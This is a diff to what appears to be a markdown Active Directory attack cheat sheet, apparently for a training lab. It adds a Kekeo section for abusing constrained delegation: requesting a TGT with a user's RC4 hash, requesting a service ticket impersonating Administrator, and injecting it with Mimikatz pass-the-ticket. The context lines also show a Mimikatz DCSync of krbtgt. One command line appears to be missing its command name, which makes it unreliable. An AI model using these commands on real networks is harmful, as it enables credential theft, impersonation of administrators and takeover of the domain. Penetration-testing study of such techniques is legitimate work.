@@ -523,6 +523,13 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 
 ### Constrained Delegation
 
+#### Pre-requisites
+#### Kekeo:
+```powershell
+.\kekeo.exe
+```
+Link: [Kekeo](https://github.com/gentilkiwi/kekeo/)
+
 **1. With Powerview dev Version:**
 ```powershell
 # Users enumeration
@@ -536,4 +543,13 @@ Get-NetComputer -Unconstrained | select -ExpandProperty dnshostname
 ```powershell
 # Enumeration users and computers with constrained delegation enabled
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+```
+**3. With Kekeo:**
+```powershell
+# Requesting TGT
+tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
+# Requesting TGS
+/tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
+# Use Mimikatz to inject the TGS
+Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```
